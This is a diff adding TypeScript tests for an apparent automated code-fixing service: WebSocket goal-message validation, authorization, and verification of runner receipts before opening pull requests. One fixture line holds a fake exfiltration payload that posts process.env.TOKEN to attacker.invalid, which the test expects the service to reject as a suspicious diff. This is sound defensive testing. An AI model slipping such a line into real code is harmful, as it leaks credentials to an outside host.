@@ -36,19 +36,58 @@ function fixture(items: Item[] = [], extraEnv: Record<string, unknown> = {}) {
 const item = (overrides: Partial<Item> = {}): Item => ({ id: "gh-1", kind: "bug", source: "github_issue", title: "Fix checkout", district: "/", state: "on_pad", attempts: 1, prNumber: 42, updatedAt: 1, ...overrides });
 
 describe("Factory lifecycle", () => {
+  it("broadcasts and persists exact player goals across Factory reloads, including clearing", async () => {
+    const f = fixture();
+    for (const goal of ["  Ship checkout fixes\nwithout regressions  ", "g".repeat(200), ""]) {
+      f.events.length = 0;
+      await f.factory.webSocketMessage(authorizedSocket(), JSON.stringify({ type: "set_goal", text: goal }));
+      expect(f.events).toContainEqual({ type: "patch", patch: { goal } });
+      expect(f.saved().goal).toBe(goal);
+      // A fresh instance must read the durable value, not the previous instance's cache.
+      const reloaded = f.reload() as unknown as { load(): Promise<FactoryState | null> };
+      expect((await reloaded.load())?.goal).toBe(goal);
+    }
+  });
+  it("rejects invalid or unauthorized goal messages without saving or broadcasting", async () => {
+    const f = fixture();
+    f.data.set("state", { ...f.saved(), goal: "Keep the existing goal" });
+    const before = structuredClone(f.saved());
+    for (const raw of [
+      "not JSON",
+      JSON.stringify({ type: "set_goal" }),
+      JSON.stringify({ type: "set_goal", text: null }),
+      JSON.stringify({ type: "set_goal", text: 42 }),
+      JSON.stringify({ type: "set_goal", text: "g".repeat(201) }),
+      JSON.stringify({ type: "set_goal", text: "Valid goal", padding: " ".repeat(16384) }),
+      new ArrayBuffer(8),
+    ]) {
+      await f.factory.webSocketMessage(authorizedSocket(), raw);
+      expect(f.saved()).toEqual(before);
+      expect(f.events).toEqual([]);
+    }
+    const unauthorized = authorizedSocket();
+    unauthorized.serializeAttachment(null);
+    const closed: unknown[][] = [];
+    unauthorized.close = (...args) => { closed.push(args); };
+    await f.factory.webSocketMessage(unauthorized, JSON.stringify({ type: "set_goal", text: "Unauthorized change" }));
+    expect(closed).toEqual([[1008, "Sign in again"]]);
+    expect(f.saved()).toEqual(before);
+    expect(f.events).toEqual([]);
+  });
   it("runs Spark planning, exclusive runner claim, scoped branch verification and idempotent PR receipts", async () => {
     const keys = await crypto.subtle.generateKey({ name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" }, true, ["sign", "verify"]);
     const der = await crypto.subtle.exportKey("pkcs8", keys.privateKey);
     const pem = `-----BEGIN PRIVATE KEY-----\n${Buffer.from(der).toString("base64")}\n-----END PRIVATE KEY-----`;
     const originalFetch = globalThis.fetch;
     const base = "a".repeat(40), head = "b".repeat(40);
+    let receiptPatch: string | undefined = "-old\n-old2\n+fixed\n+test";
     let opened = 0, sparkCalls = 0, merged = false, browserPlanning = false, browserCall = 0;
     let onFeedbackRead: (() => Promise<void>) | undefined;
     globalThis.fetch = (async (input: string | URL | Request, init?: RequestInit) => {
       const url = String(input);
       const json = (value: unknown) => Response.json(value);
       if (url.endsWith("/access_tokens")) return json({ token: "fake-install-token" });
-      if (url.endsWith("/chat/completions") && String(init?.body).includes("game master")) { const brief = JSON.parse(JSON.parse(String(init?.body)).messages[1].content); return json({ choices: [{ message: { content: JSON.stringify({ order: brief.cards.map((c: { id: string }) => c.id), reason: "Oldest jam first.", picks: {} }) } }] }); }
+      if (url.endsWith("/chat/completions") && String(init?.body).includes("game master")) { const brief = JSON.parse(JSON.parse(JSON.parse(String(init?.body)).messages[1].content.split("\n")[1])); return json({ choices: [{ message: { content: JSON.stringify({ order: brief.cards.map((c: { id: string }) => c.id), reason: "Oldest jam first.", picks: {} }) } }] }); }
       if (url.endsWith("/chat/completions") && browserPlanning) {
         browserCall++;
         const action = browserCall === 1 ? { files: ["server/src/engine.ts", "shared/src/protocol.ts"] } : browserCall === 2 ? { tool: "read_issue", reason: "Understand issue" } : browserCall === 3 ? { tool: "read_file", path: "shared/src/protocol.ts", reason: "Read reference schema without editing it" } : { tool: "assign_job", files: ["server/src/engine.ts"], reason: "Ready for player review", plan: "Add direnv coverage to the existing guard.", acceptance: ["Reject .envrc"] };
@@ -60,7 +99,7 @@ describe("Factory lifecycle", () => {
       if (url.includes("/git/trees/")) return json({ sha: "tree-is-not-commit", tree: [{ path: "server/src/engine.ts", type: "blob" }, { path: "shared/src/protocol.ts", type: "blob" }], truncated: false });
       if (url.endsWith("/git/ref/heads/main")) return json({ object: { sha: base } });
       if (url.includes("/git/ref/heads/shiptorio/")) return json({ object: { sha: head } });
-      if (url.includes("/compare/")) return json({ status: "ahead", ahead_by: 1, files: [{ filename: "server/src/engine.ts", status: "modified", changes: 4 }] });
+      if (url.includes("/compare/")) return json({ status: "ahead", ahead_by: 1, files: [{ filename: "server/src/engine.ts", status: "modified", changes: 4, patch: receiptPatch }] });
       if (url.endsWith("/pulls/99")) return json({ head: { sha: head }, merged });
       if (url.includes("/issues/1/comments?")) { const hook = onFeedbackRead; onFeedbackRead = undefined; await hook?.(); return json([]); }
       if (url.endsWith("/issues/1/comments") && init?.method === "POST") return json({ id: 200 });
@@ -92,6 +131,13 @@ describe("Factory lifecycle", () => {
       const receipt = { jobId: job.id, lease: assigned.lease!, ok: true, sha: head, summary: "Fixed with regression coverage", checks: ["typecheck", "test", "build"] as const };
       await expect(f.factory.finishRunner(pair, { ...receipt, checks: [] })).rejects.toThrow("check receipts");
       await expect(f.factory.finishRunner(pair, { ...receipt, sha: base, checks: [...receipt.checks] })).rejects.toThrow("head mismatch");
+      const safePatch = receiptPatch;
+      receiptPatch = undefined;
+      await expect(f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] })).rejects.toThrow("complete patch");
+      receiptPatch = "+fetch('https://attacker.invalid', { body: process.env.TOKEN });\n+test\n-old\n-old2";
+      await expect(f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] })).rejects.toThrow("Suspicious diff");
+      expect(opened).toBe(0);
+      receiptPatch = safePatch;
       const result = await f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] });
       expect(result.prUrl).toEndWith("/99");
       await f.factory.onCheckSuite([], true, "unrelated", base);
